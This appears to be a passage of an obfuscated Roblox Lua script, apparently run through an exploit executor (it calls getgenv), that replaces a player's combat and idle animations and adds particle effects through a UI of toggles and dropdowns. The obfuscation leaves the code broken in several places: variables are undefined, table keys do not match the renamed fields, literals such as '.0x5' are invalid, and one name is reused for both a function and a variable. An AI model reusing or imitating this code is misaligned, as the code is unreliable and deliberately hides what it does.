["\069\109\101\114\103\101"]="\069\109\101\114\103\101", ["\090\111\109\098\105\101\032\077\097\110\032\040\065\120\101\041"]="\090\111\109\098\105\101\065\120\101", ["\090\111\109\098\105\101\032\077\097\110\032\040\068\101\097\103\108\101\041"]="\090\111\109\098\105\101\068\101\097\103\108\101", ["\090\111\109\098\105\101\032\077\097\110\032\040\083\104\111\116\103\117\110\041"]="\090\111\109\098\105\101\083\104\111\116\103\117\110", } _IllllIIlII:AddToggle("\067\117\115\116\111\109\077\049\069\110\097\098\108\101\100", { Text = "\069\110\097\098\108\101\032\067\117\115\116\111\109\032\077\049\039\115", Default = false, }) _IllllIIlII:AddDivider() for _IIllIllIll = 0x1, 0x4 do local _IlIIIlllll = _IIllllIIlI if _IIllIllIll == 0x3 then _IlIIIlllll = {} for _lIIlIllIlI, _lIllllllII in ipairs(_IIllllIIlI) do if _lIllllllII ~= "\069\109\101\114\103\101" then table.insert(_IlIIIlllll, _lIllllllII) end
 end
 end
 _IllllIIlII:AddDropdown("\067\117\115\116\111\109\077\049\095\083\108\111\116"..i, { Text = "\077\049\032"..i, Values = _IlIIIlllll, Default = 0x1, Multi = false, Searchable = false, }) end
 local function _IIIIllllIl(_IIIIlllIlI) local _IlIIIllIIl = _lIIlIllIlI["\067\117\115\116\111\109\077\049\095\083\108\111\116"..slot] if not _IlIIIllIIl or _IlIIIllIIl.Value == "\068\101\102\097\117\108\116" then return nil, nil end
 local _lIIlIIlIII if _IlIIIllIIl.Value == "\082\097\110\100\111\109" then _lIIlIIlIII = _IIllIIllll[math.random(0x1, #_IIllIIllll)] else _lIIlIIlIII = _IIIIIIIlIl[_IlIIIllIIl.Value] end
 if not _lIIlIIlIII then return nil, nil end
 local _lIIIIIlIll = _IlllllIllI[_lIIlIIlIII] return _lIIIIIlIll and _lIIIIIlIll[_IIIIlllIlI], _lIIlIIlIII end
 local _IlIllllIll = nil local _lIlllllllI = nil local _IIIlIlllll = nil local _IlIlllIIll = {} local function _IIIlIlllll() for _lIIlIllIlI, _lIIIllIIll in pairs(_IlIlllIIll) do pcall( function () if _lIIIllIIll.IsPlaying then _lIIIllIIll:Stop() end
 end
 ) end
 table.clear(_IlIlllIIll) end
 local function _lllIlllIIl(_lIlIIllIII) if _IlIllllIll then _IlIllllIll:Disconnect() _IlIllllIll = nil end
 _IIIlIlllll() _IIIlIlllll = _lIlIIllIII if not _lIlIIllIII then return end
 _IlIllllIll = _lIlIIllIII.AnimationPlayed:Connect( function (_IlIlIlIlIl) if not _llIIllIlll.CustomM1Enabled.Value then return end
 local _IIIIIIIlII = _IlIlIlIlIl.Animation and _IlIlIlIlIl.Animation.AnimationId or "" local _IIIIIIlIII = _IIIIIIIlII:match("\037\100\043") if not _IIIIIIlIII then return end
 local _IIIIlllIlI = _lIIIIIllll[_IIIIIIlIII] if not _IIIIlllIlI then return end
 local _IlIlllIllI, _lIIlIIlIII = _IIIIllllIl(_IIIIlllIlI) if not _IlIlllIllI then return end
 if _IlIlllIllI == _IIIIIIlIII then return end
 _IIIlIlllll() _IlIlIlIlIl:AdjustSpeed(0x0) _IlIlIlIlIl:AdjustWeight(-0x98967F, false) local _IlIllllIlI = Instance.new("\065\110\105\109\097\116\105\111\110") _IlIllllIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047"..customId local _lIIIllIIll = _lIlIIllIII:LoadAnimation(_IlIllllIlI) _IlIlllIIll[#_IlIlllIIll + 0x1] = _lIIIllIIll _lIIIllIIll.Priority = Enum.AnimationPriority.Action3 _lIIIllIIll:Play(0x0) end
 ) end
 _lIlllllllI = RunService.Heartbeat:Connect( function () local _IIllIIlllI = _llIlIIlIll.Character if not _IIllIIlllI then return end
 local _lIlIIllIII = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIlIIllIII ~= _IIIlIlllll then _lllIlllIIl(_lIlIIllIII) end
 end
 ) table.insert(_IllIllIIll, function () if _IlIllllIll then _IlIllllIll:Disconnect() _IlIllllIll = nil end
 if _lIlllllllI then _lIlllllllI:Disconnect() _lIlllllllI = nil end
 _IIIlIlllll() _IIIlIlllll = nil pcall( function () _llIIllIlll.CustomM1Enabled:SetValue(false) end
 ) end
 ) _IllllIIlII:AddDivider() _IllllIIlII:AddToggle("\067\117\115\116\111\109\068\111\119\110\115\108\097\109\069\110\097\098\108\101\100", { Text = "\069\110\097\098\108\101\032\067\117\115\116\111\109\032\068\111\119\110\115\108\097\109", Default = false, }) _IllllIIlII:AddDropdown("\067\117\115\116\111\109\068\111\119\110\115\108\097\109\095\065\110\105\109", { Text = "\067\117\115\116\111\109\032\068\111\119\110\115\108\097\109", Values = { "\068\101\102\097\117\108\116", "\082\097\110\100\111\109", "\070\108\105\112", "\068\111\119\110\032\070\097\108\108", "\072\097\114\100\032\080\114\101\115\115", "\085\115\101\108\101\115\115" }, Default = 0x1, Multi = false, Searchable = false, }) local _lIIlIllllI = nil local _IllIIIIIIl = nil local _lIIIIIIIII = nil local _llIIIlIlll = { ["\070\108\105\112"] = { _IlIIIllllI = "\049\055\056\053\057\048\053\053\054\055\049", timePos = 0.1, _IllIIllIlI = 2.0 }, ["\068\111\119\110\032\070\097\108\108"] = { _IlIIIllllI = "\049\055\056\053\056\056\055\056\048\050\055", timePos = 0.25, _IllIIllIlI = nil }, ["\072\097\114\100\032\080\114\101\115\115"] = { _IlIIIllllI = "\049\056\052\054\052\051\053\054\050\051\051", timePos = 0.5, _IllIIllIlI = 3.0 }, ["\085\115\101\108\101\115\115"] = { _IlIIIllllI = "\049\054\053\055\049\057\048\057\057\048\056", timePos = 2.25, _IllIIllIlI = 0.75 }, } local function _llIIlIIIIl(_lIlIIllIII) if _lIIlIllllI then _lIIlIllllI:Disconnect() _lIIlIllllI = nil end
 _lIIIIIIIII = _lIlIIllIII if not _lIlIIllIII then return end
 _lIIlIllllI = _lIlIIllIII.AnimationPlayed:Connect( function (_IlIlIlIlIl) if not _llIIllIlll.CustomDownslamEnabled.Value then return end
 local _IIIIIIIlII = _IlIlIlIlIl.Animation and _IlIlIlIlIl.Animation.AnimationId or "" if not _IIIIIIIlII:match("\049\048\052\055\048\049\048\052\050\052\050") then return end
 local _IlIIIllIIl = _lIIlIllIlI.CustomDownslam_Anim and _lIIlIllIlI.CustomDownslam_Anim.Value or "\068\101\102\097\117\108\116" if _IlIIIllIIl == "\082\097\110\100\111\109" then local _llIIlllIII = { "\070\108\105\112", "\068\111\119\110\032\070\097\108\108", "\072\097\114\100\032\080\114\101\115\115", "\085\115\101\108\101\115\115" } _IlIIIllIIl = _llIIlllIII[math.random(0x1, #_llIIlllIII)] end
 local _llIlIllIll = _llIIIlIlll[_IlIIIllIIl] if not _llIlIllIll then return end
 _IlIlIlIlIl:AdjustWeight(-0x98967F, false) local _IlIllllIlI = Instance.new("\065\110\105\109\097\116\105\111\110") _IlIllllIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _llIlIllIll.id local _lIIIllIIll = _lIlIIllIII:LoadAnimation(_IlIllllIlI) _lIIIllIIll.Priority = Enum.AnimationPriority.Action3 _lIIIllIIll:Play(0.1) if _llIlIllIll.speed then _lIIIllIIll:AdjustSpeed(_llIlIllIll.speed) end
 if _llIlIllIll.timePos then _lIIIllIIll.TimePosition = _llIlIllIll.timePos end
 _IlIlIlIlIl.Stopped:Connect( function () pcall( function () _lIIIllIIll:Stop(0.25) end
 ) end
 ) end
 ) end
 local _IlIIlllIll = false local function _llIlllllIl(_lIlIIllIII) if not _lIlIIllIII then return end
 _IlIIlllIll = false task.spawn( function () local _IIllIIlllI = _llIlIIlIll.Character if not _IIllIIlllI then return end
 local _IIlIIIIIIl = _lIlIIllIII:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") or _lIlIIllIII:WaitForChild("\065\110\105\109\097\116\111\114", 0x5) if not _IIlIIIIIIl then return end
 local _llIIIIllll = nil local function _llIllIIIlI(obj) if obj:IsA("\066\111\100\121\086\101\108\111\099\105\116\121") then obj.Velocity = Vector3.new(obj.Velocity.X, 0x0, obj.Velocity.Z) end
 end
 _llIIIIllll = _IIllIIlllI.DescendantAdded:Connect(_llIllIIIlI) for _lIIlIllIlI, _llIIIlIIIl in pairs(_IIllIIlllI:GetDescendants()) do _llIllIIIlI(_llIIIlIIIl) end
 if _llIIIIllll then _llIIIIllll:Disconnect() _llIIIIllll = nil end
 _IlIIlllIll = true end
 ) end
 _IllIIIIIIl = RunService.Heartbeat:Connect( function () local _IIllIIlllI = _llIlIIlIll.Character if not _IIllIIlllI then return end
 local _lIlIIllIII = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIlIIllIII ~= _lIIIIIIIII then _llIIlIIIIl(_lIlIIllIII) _llIlllllIl(_lIlIIllIII) end
 end
 ) task.spawn( function () local _IIllIIlllI = _llIlIIlIll.Character or _llIlIIlIll.CharacterAdded:Wait() local _lIlIIllIII = _IIllIIlllI and (_IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") or _IIllIIlllI:WaitForChild("\072\117\109\097\110\111\105\100", 0x3)) if _lIlIIllIII then _llIlllllIl(_lIlIIllIII) end
 end
 ) table.insert(_IllIllIIll, function () if _lIIlIllllI then _lIIlIllllI:Disconnect() _lIIlIllllI = nil end
 if _IllIIIIIIl then _IllIIIIIIl:Disconnect() _IllIIIIIIl = nil end
 _lIIIIIIIII = nil pcall( function () _llIIllIlll.CustomDownslamEnabled:SetValue(false) end
 ) end
 ) _IllllIIlII:AddDivider() _IllllIIlII:AddToggle("\067\117\115\116\111\109\085\112\112\101\114\099\117\116\069\110\097\098\108\101\100", { Text = "\069\110\097\098\108\101\032\067\117\115\116\111\109\032\085\112\112\101\114\099\117\116", Default = false, }) local _llIlIIIlll = { { _lIIIIllIIl = "\084\104\114\111\119", _IlIIIllllI = "\049\051\054\051\055\048\055\051\055\054\051\051\054\052\057", timePos = 0x1, _IllIIllIlI = 1.2, stopAfter = 0.3, stopFade = 0x1 }, { _lIIIIllIIl = "\072\101\097\118\121", _IlIIIllllI = "\049\052\057\048\048\049\054\056\055\050\048", timePos = 1.3, _IllIIllIlI = 0x1, stopAfter = nil }, { _lIIIIllIIl = "\083\105\109\112\108\101", _IlIIIllllI = "\049\050\057\049\050\051\057\054\048\055\052\050\052\051\056", timePos = 2.8, _IllIIllIlI = nil, stopAfter = nil, stopFade = 0.2 }, { _lIIIIllIIl = "\066\097\108\108\032\077\105\103\104\116", _IlIIIllllI = "\049\050\053\050\054\053\052\053\057\056\056\054\056\054\051", timePos = 5.20, _IllIIllIlI = 1.3, stopAfter = nil, stopTrigger = 6.15, stopFade = 0.2 }, } local _lIIIIIlIll = { "\068\101\102\097\117\108\116", "\082\097\110\100\111\109" } for _lIIlIllIlI, _lIllllllII in ipairs(_llIlIIIlll) do table.insert(_lIIIIIlIll, _lIllllllII.name) end
 _IllllIIlII:AddDropdown("\067\117\115\116\111\109\085\112\112\101\114\099\117\116\095\065\110\105\109", { Text = "\067\117\115\116\111\109\032\085\112\112\101\114\099\117\116", Values = _lIIIIIlIll, Default = 0x1, Multi = false, Searchable = false, }) local _lIllIlIIII = nil local _IIIIlIllII = nil local _IIllllIlII = nil local function _llllIIIIlI(_lIlIIllIII) if _lIllIlIIII then _lIllIlIIII:Disconnect() _lIllIlIIII = nil end
 _IIllllIlII = _lIlIIllIII if not _lIlIIllIII then return end
 _lIllIlIIII = _lIlIIllIII.AnimationPlayed:Connect( function (_IlIlIlIlIl) local _IlIIIllllI = _IlIlIlIlIl.Animation and _IlIlIlIlIl.Animation.AnimationId:match("\037\100\043") or "" if _IlIIIllllI ~= "\049\048\053\048\051\051\056\049\050\051\056" then return end
 local _llllIlllII = _lIIlIllIlI.M1EffectsStyle and _lIIlIllIlI.M1EffectsStyle.Value if _llllIlllII and _llllIlllII ~= "\079\102\102" then task.spawn( function () local _IIllIIlllI = _llIlIIlIll.Character if not _IIllIIlllI then return end
 local _IIlIllIlII = _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _IIlIllIlII then return end
 local _llIIlIIlIl = OverlapParams.new() _llIIlIIlIl.FilterType = Enum.RaycastFilterType.Exclude _llIIlIIlIl.FilterDescendantsInstances = { _IIllIIlllI } local _lIllIIlllI = workspace:GetPartBoundsInRadius( (_IIlIllIlII.CFrame * CFrame.new(0x0, 0x0, -2.5)).Position, 0x6, _llIIlIIlIl ) local _IlIlIlIlll = nil for _lIIlIllIlI, _IllllllIIl in pairs(_lIllIIlllI) do if _IllllllIIl.Parent:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") and _IllllllIIl.Parent.Name ~= _llIlIIlIll.Name then _IlIlIlIlll = _IllllllIIl.Parent end
 end
 if not _IlIlIlIlll then return end
 local _llllIIlllI = _IlIlIlIlll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _llllIIlllI then return end
 local _lIIlllIllI = _llllIIlllI.Health local _IIllIlllIl = nil _IIllIlllIl = _llllIIlllI:GetPropertyChangedSignal("\072\101\097\108\116\104"):Connect( function () if _llllIIlllI.Health < _lIIlllIllI then if _IIllIlllIl then _IIllIlllIl:Disconnect() _IIllIlllIl = nil end
 local _lIIIIIllII = _IlIlIlIlll:FindFirstChild("\084\111\114\115\111") if not _lIIIIIllII then return end
 local _llIlIlllll = game:GetService("\082\101\112\108\105\099\097\116\101\100\083\116\111\114\097\103\101"):FindFirstChild("\082\101\115\111\117\114\099\101\115") if not _llIlIlllll then return end
 local _lIlIllIlIl = Instance.new("\083\111\117\110\100", _lIIIIIllII) _lIlIllIlIl.SoundId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\051\048\054\052\050\050\051\051\057\057" _lIlIllIlIl.Volume = _m1FxVol() _lIlIllIlIl.PlayOnRemove = true _lIlIllIlIl:Destroy() local _lIIlIlIIII = _llIlIlllll.KJEffects.DropkickExtra.firstHit:Clone() for _lIIlIllIlI, desc in pairs(_lIIlIlIIII:GetDescendants()) do if desc:IsA("\066\097\115\101\080\097\114\116") then desc.CanCollide = false desc.Anchored = true desc.Massless = true end
 end
 if _lIIlIlIIII:IsA("\066\097\115\101\080\097\114\116") then _lIIlIlIIII.CanCollide = false _lIIlIlIIII.Anchored = true _lIIlIlIIII.Massless = true end
 _lIIlIlIIII.Parent = workspace _lIIlIlIIII.CFrame = _lIIIIIllII.CFrame local _IllIlIlIIl = nil for _lIIlIllIlI, desc in pairs(_lIIlIlIIII:GetDescendants()) do if desc.Name == "\087\105\110\100" then _IllIlIlIIl = desc.Parent end
 end
 if _IllIlIlIIl then _IllIlIlIIl.Wind:Emit(0x1E) end
 game:GetService("\068\101\098\114\105\115"):AddItem(_lIIlIlIIII, 0x2) end
 _lIIlllIllI = _llllIIlllI.Health end
 ) task.delay(0x1, function () if _IIllIlllIl then _IIllIlllIl:Disconnect() _IIllIlllIl = nil end
 end
 ) end
 ) end
 if not _llIIllIlll.CustomUppercutEnabled.Value then return end
 local _IlIIIllIIl = _lIIlIllIlI.CustomUppercut_Anim and _lIIlIllIlI.CustomUppercut_Anim.Value or "\068\101\102\097\117\108\116" if _IlIIIllIIl == "\068\101\102\097\117\108\116" then return end
 local _llIlIllIll = nil if _IlIIIllIIl == "\082\097\110\100\111\109" then _llIlIllIll = _llIlIIIlll[math.random(0x1, #_llIlIIIlll)] else for _lIIlIllIlI, _lIllllllII in ipairs(_llIlIIIlll) do if _lIllllllII.name == _IlIIIllIIl then _llIlIllIll = _lIllllllII break end
 end
 end
 if not _llIlIllIll then return end
 _IlIlIlIlIl:AdjustWeight(-0x98967F, false) local _IlIllllIlI = Instance.new("\065\110\105\109\097\116\105\111\110") _IlIllllIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _llIlIllIll.id local _lIIIllIIll = _lIlIIllIII:LoadAnimation(_IlIllllIlI) _lIIIllIIll.Priority = Enum.AnimationPriority.Action3 _lIIIllIIll:Play(0.1) if _llIlIllIll.speed then _lIIIllIIll:AdjustSpeed(_llIlIllIll.speed) end
 if _llIlIllIll.timePos then _lIIIllIIll.TimePosition = _llIlIllIll.timePos end
 if _llIlIllIll.stopTrigger then local _lllIlIlllI _lllIlIlllI = RunService.Heartbeat:Connect( function () if not _lIIIllIIll.IsPlaying or _lIIIllIIll.TimePosition >= _llIlIllIll.stopTrigger then if _lllIlIlllI then _lllIlIlllI:Disconnect() _lllIlIlllI = nil end
 pcall( function () _lIIIllIIll:Stop(_llIlIllIll.stopFade or 0x0) end
 ) end
 end
 ) elseif _llIlIllIll.stopAfter then task.delay(_llIlIllIll.stopAfter, function () pcall( function () _lIIIllIIll:Stop(_llIlIllIll.stopFade or 0x0) end
 ) end
 ) else _IlIlIlIlIl.Stopped:Once( function () pcall( function () _lIIIllIIll:Stop(_llIlIllIll.stopFade or 0x0) end
 ) end
 ) end
 end
 ) end
 _IIIIlIllII = RunService.Heartbeat:Connect( function () local _IIllIIlllI = _llIlIIlIll.Character if not _IIllIIlllI then return end
 local _lIlIIllIII = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIlIIllIII ~= _IIllllIlII then _llllIIIIlI(_lIlIIllIII) end
 end
 ) table.insert(_IllIllIIll, function () if _lIllIlIIII then _lIllIlIIII:Disconnect() _lIllIlIIII = nil end
 if _IIIIlIllII then _IIIIlIllII:Disconnect() _IIIIlIllII = nil end
 _IIllllIlII = nil pcall( function () _llIIllIlll.CustomUppercutEnabled:SetValue(false) end
 ) end
 ) end
 local TweenService = game:GetService("\084\119\101\101\110\083\101\114\118\105\099\101") local _lllIIlIllI = _lllIlIIlIl local _IllIIIllIl = { "\078\111\114\109\097\108","\082\097\110\100\111\109", "\091\068\069\070\093\032\087\097\116\099\104","\091\068\069\070\093\032\067\097\115\117\097\108","\091\068\069\070\093\032\067\111\110\102\105\100\101\110\116","\091\068\069\070\093\032\070\101\110\116\032\077\097\115\116\101\114","\091\068\069\070\093\032\070\108\121\032\073\100\108\101", "\091\068\069\070\093\032\065\117\114\097","\091\068\069\070\093\032\083\101\114\105\111\117\115","\091\068\069\070\093\032\082\101\119\111\114\107","\091\068\069\070\093\032\080\114\101\112\097\114\105\110\103","\091\068\069\070\093\032\068\105\118\105\110\101","\091\068\069\070\093\032\071\111\100", "\091\083\071\093\032\077\097\121\104\101\109","\091\083\071\093\032\082\097\105\110\098\111\119","\091\083\071\093\032\090\121\108\101\100\111\110", "\091\083\071\093\032\080\101\114\115\105\115\116\101\110\099\101","\091\083\071\093\032\080\117\114\105\116\121","\091\083\071\093\032\069\117\099\108\105\100\101\097\110", "\091\083\071\093\032\069\113\117\105\110\111\120","\091\083\071\093\032\067\114\097\122\101\100","\091\083\071\093\032\084\104\101\032\066\105\103\032\066\108\097\099\107", "\091\083\071\093\032\067\111\110\116\097\109\105\110\097\110\116", } _lllIIlIllI:AddDropdown("\073\100\108\101\065\110\105\109\097\116\105\111\110", { Values = _IllIIIllIl, Default = 0x1, Multi = false, Text = "\073\100\108\101\032\065\110\105\109\097\116\105\111\110", Searchable = true, }) _lllIIlIllI:AddSlider("\073\100\108\101\065\110\105\109\097\116\105\111\110\083\116\097\114\116\070\097\100\101\084\105\109\101", { Text = "\073\100\108\101\032\065\110\105\109\097\116\105\111\110\032\083\116\097\114\116\032\070\097\100\101\032\084\105\109\101", Default = 0.2, Min = 0.1, Max = 0x1, Rounding = 0x2, }) _lllIIlIllI:AddSlider("\073\100\108\101\065\110\105\109\097\116\105\111\110\069\110\100\070\097\100\101\084\105\109\101", { Text = "\073\100\108\101\032\065\110\105\109\097\116\105\111\110\032\069\110\100\032\070\097\100\101\032\084\105\109\101", Default = 0.2, Min = 0.1, Max = 0x1, Rounding = 0x2, }) local _IIllllllll _lllIIlIllI:AddToggle("\083\071\086\070\088\084\111\103\103\108\101", { Text = "\069\110\097\098\108\101\032\083\071\032\086\070\088", Default = false, Callback = function () if _IIllllllll then _IIllllllll() end
 end
 , }) local _lIllllllIl = nil local _lllIIIIllI = nil local _IllIIIlllI = nil local _IlIIllllll = nil local _llIIllIIII = nil local _lIIIIIIlIl = nil local _IllIIIIlII = nil local _IIIlllIIlI = false local _IlIllIIlIl = 0x0 local _lIlIIIllII = "" local _llIlIllIIl = "" local _lIlIlIlIII = false local _IIllllIIIl = 0x0 local _llIlllIlll = false local _lIllIIIlll = nil local _lIlIIlllll = nil local function _IIllIlIlIl() return (getgenv().Enviroment and pcall( function () return getgenv().Enviroment.Parent end
 ) and getgenv().Enviroment) or workspace end
 local function _llIIIIllIl() return (getgenv().music and getgenv().music.PlaybackLoudness) or 0x0 end
 local _IIllIIlllI = { MODE_NAME = true, Text = true } local function _IlIlllIllI(_IlIlIllIll) if not _IlIlIllIll then return end
 for _lIIlIllIlI, _llIIIlIIIl in pairs(_IlIlIllIll:GetDescendants()) do if _llIIIlIIIl:IsA("\066\105\108\108\098\111\097\114\100\071\117\105") and _IIllIIlllI[_llIIIlIIIl.Name] then pcall( function () _llIIIlIIIl:Destroy() end
 ) end
 end
 end
 local function _lllllIllII(_IlIlIllIll) _IlIlllIllI(_IlIlIllIll) if _lIllIIIlll then _lIllIIIlll:Disconnect() _lIllIIIlll = nil end
 if not _IlIlIllIll then return end
 _lIllIIIlll = _IlIlIllIll.DescendantAdded:Connect( function (obj) if obj:IsA("\066\105\108\108\098\111\097\114\100\071\117\105") and _IIllIIlllI[obj.Name] then pcall( function () obj:Destroy() end
 ) end
 end
 ) end
 local function _IIIIIlIlII() return type(_llIlIllIIl) == "\115\116\114\105\110\103" and _llIlIllIIl:sub(0x1,0x4) == "\091\083\071\093" end
 local function _IlIIIIllll(idleName, _IlIIlllIlI) local _lllIlIIlIl = game:GetService("\084\119\101\101\110\083\101\114\118\105\099\101") local _llIlIIlIll = game:GetService("\068\101\098\114\105\115") local function _IIllIIIIll() return _IIllllIIIl == _IlIIlllIlI end
 local function _IIIllIllIl() local _IlIlIllIll = _llIlIIlIll.Character local _IllIllIIll = _IlIlIllIll and _IlIlIllIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") return _IlIlIllIll, _IllIllIIll end
 if idleName == "\091\083\071\093\032\080\101\114\115\105\115\116\101\110\099\101" then local _IIlIlIIIlI = 0x0; local _IIllIllIll = 0x0 while _IIllIIIIll() do _IIllIllIll = _IIllIllIll + 0x1; _IIlIlIIIlI = _IIlIlIIIlI + .0x5 local _IIllIIlllI, _IIlIllIlII = _IIIllIllIl() if not _IIllIIlllI or not _IIlIllIlII then task.wait(.0x5) continue end
 local _IlIllIlIll = _IIllIIlllI:FindFirstChild("\082\105\103\104\116\032\065\114\109") if not _IlIllIlIll then task.wait(.0x5) continue end
 spawn( function () local _lIIlIIlllI=Instance.new("\080\097\114\116"); _lIIlIIlllI.Parent=_IIllIlIlIl() _lIIlIIlllI.Material=Enum.Material.Neon; _lIIlIIlllI.Size=Vector3.new(0x1,0x1,0x1) _lIIlIIlllI.Anchored=true; _lIIlIIlllI.CanCollide=false local _lllIIIlIII=Instance.new("\083\112\101\099\105\097\108\077\101\115\104",_lIIlIIlllI); _lllIIIlIII.MeshType="\083\112\104\101\114\101" _lIIlIIlllI.CFrame=_IlIllIlIll.CFrame*CFrame.new(0x0,-0x1,0x0)*CFrame.Angles(0x0,_IIllIllIll/0x5,math.rad(0x5A)) _lIIlIIlllI.Color=Color3.new(0x0,0x0,0x1); _lllIIIlIII.Scale=Vector3.new(0x1,0x1,0x1) _llIlIIlIll:AddItem(_lIIlIIlllI,1.5) _lllIlIIlIl:Create(_lIIlIIlllI,TweenInfo.new(.0x6),{CFrame=_lIIlIIlllI.CFrame*CFrame.new(0x0,0x2,0x0),Transparency=0x1,Color=Color3.new(0x0,.0x3,.0x3)}):Play() _lllIlIIlIl:Create(_lllIIIlIII,TweenInfo.new(.0x6),{Scale=Vector3.new(0x0,0x1,0x0)}):Play() local _lIIIIIIlIl=Instance.new("\080\097\114\116"); _lIIIIIIlIl.Parent=_IIllIlIlIl() _lIIIIIIlIl.Material=Enum.Material.Neon; _lIIIIIIlIl.Size=Vector3.new(0x1,0x1,0x1) _lIIIIIIlIl.Anchored=true; _lIIIIIIlIl.CanCollide=false local _IIlllIllIl=Instance.new("\083\112\101\099\105\097\108\077\101\115\104",_lIIIIIIlIl); _IIlllIllIl.MeshType="\083\112\104\101\114\101" _lIIIIIIlIl.CFrame=_IlIllIlIll.CFrame*CFrame.new(0x0,-0x1,0x0)*CFrame.Angles(0x0,math.rad(0xB4)+_IIllIllIll/0x5,math.rad(0x5A)) _lIIIIIIlIl.Color=Color3.new(0x0,0x0,0x1); _IIlllIllIl.Scale=Vector3.new(0x1,0x1,0x1) _llIlIIlIll:AddItem(_lIIIIIIlIl,1.5) _lllIlIIlIl:Create(_lIIIIIIlIl,TweenInfo.new(.0x6),{CFrame=_lIIIIIIlIl.CFrame*CFrame.new(0x0,0x2,0x0),Transparency=0x1,Color=Color3.new(0x0,.0x3,.0x3)}):Play() _lllIlIIlIl:Create(_IIlllIllIl,TweenInfo.new(.0x6),{Scale=Vector3.new(0x0,0x1,0x0)}):Play() if _IIlIlIIIlI >= 0x5 then _IIlIlIIIlI = 0x0 local _lIllllllII=Instance.new("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114",_lIIIIIIlIl) _lIllllllII.LightEmission=0xF; _lIllllllII.LightInfluence=0x1; _lIllllllII.Size=NumberSequence.new(0x2,0x0) _lIllllllII.Name="\095\082\115\109\111\107\101"; _lIllllllII.Transparency=NumberSequence.new(0x1,0x0,0x1); _lIllllllII.Lifetime=NumberRange.new(1.4) _lIllllllII.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,Color3.fromRGB(0x0,0xF,0xFF)),ColorSequenceKeypoint.new(0x1,Color3.fromRGB(0x0,0x0,0xFF))} _lIllllllII.Rate=0x0; _lIllllllII.Speed=NumberRange.new(0x1); _lIllllllII:Emit() _lIllllllII.SpreadAngle=Vector2.new(0x1E,0x1E); _lIllllllII.Rotation=NumberRange.new(0x1,0x168); _lIllllllII.RotSpeed=NumberRange.new(-0x64,0x64) _lIllllllII.Texture="\114\098\120\097\115\115\101\116\105\100\058\047\047\057\052\055\048\054\053\057\056\057\057"; _lIllllllII.Brightness=0x9FB _lIllllllII.LightEmission=0xA; _lIllllllII.LightInfluence=0x0; _lIllllllII.Orientation="\086\101\108\111\099\105\116\121\080\097\114\097\108\108\101\108" _lIllllllII.FlipbookFramerate=NumberRange.new(0x42); _lIllllllII.FlipbookLayout="\071\114\105\100\056\120\056"; _lIllllllII.FlipbookMode="\076\111\111\112"; _lIllllllII.ZOffset=-0x2 end
 local _lIllIlIIII=Instance.new("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114",_lIIIIIIlIl) _lIllIlIIII.LightEmission=0x37; _lIllIlIIII.Texture="\114\098\120\097\115\115\101\116\105\100\058\047\047\050\056\052\050\048\053\052\048\051" _lIllIlIIII.Color=ColorSequence.new(Color3.new(0x1,0x1,0x1)); _lIllIlIIII.Rate=0x0; _lIllIlIIII:Emit(0x2) _lIllIlIIII.Orientation="\086\101\108\111\099\105\116\121\080\097\114\097\108\108\101\108"; _lIllIlIIII.Lifetime=NumberRange.new(0x1) _lIllIlIIII.Size=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x0),NumberSequenceKeypoint.new(.0x5,0x1),NumberSequenceKeypoint.new(0x1,0x0)}) _lIllIlIIII.Squash=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x1),NumberSequenceKeypoint.new(0x1,0x0)}) _lIllIlIIII.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x0),NumberSequenceKeypoint.new(.0x1,.0x9),NumberSequenceKeypoint.new(0x1,0x1)}) _lIllIlIIII.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,Color3.fromRGB(0x0,0x0,0xFF)),ColorSequenceKeypoint.new(0x1,Color3.fromRGB(0x0,0x0,0xFF))} _lIllIlIIII.Speed=NumberRange.new(.0x1); _lIllIlIIII.VelocitySpread=0x0; _lIllIlIIII.ZOffset=0x5 _lIllIlIIII.LockedToPart=true; _lIllIlIIII.Rotation=NumberRange.new(0x5A); _lIllIlIIII.RotSpeed=NumberRange.new(0x0) task.delay(.0x5, function () _lIllIlIIII.Rate=0x0 end
 ) end
 ) task.wait(.0x5) end
 elseif idleName == "\091\083\071\093\032\080\117\114\105\116\121" then while _IIllIIIIll() do local _IIllIIlllI, _IIlIllIlII = _IIIllIllIl() if not _IIllIIlllI or not _IIlIllIlII then task.wait(.0x5) continue end
 local _lIIlIIIlIl=Instance.new("\080\097\114\116"); _llIlIIlIll:AddItem(_lIIlIIIlIl,1.5) _lIIlIIIlIl.Material=Enum.Material.Neon; _lIIlIIIlIl.Size=Vector3.new(0x1,0x1,0x1) _lIIlIIIlIl.Anchored=true; _lIIlIIIlIl.CanCollide=false; _lIIlIIIlIl.Color=Color3.new(0x0,0x1,0x1) _lIIlIIIlIl.Parent=_IIllIlIlIl() local _lllIIIlIII=Instance.new("\083\112\101\099\105\097\108\077\101\115\104",_lIIlIIIlIl); _lllIIIlIII.MeshType="\083\112\104\101\114\101" local _lIllIlIIII=Instance.new("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114",_lIIlIIIlIl) _lIllIlIIII.LightEmission=0xF; _lIllIlIIII.Brightness=0x1; _lIllIlIIII.Texture="\114\098\120\097\115\115\101\116\105\100\058\047\047\054\054\055\051\048\050\049\057\056\052" _lIllIlIIII.Rate=0x9B; _lIllIlIIII.Lifetime=NumberRange.new(1.5) 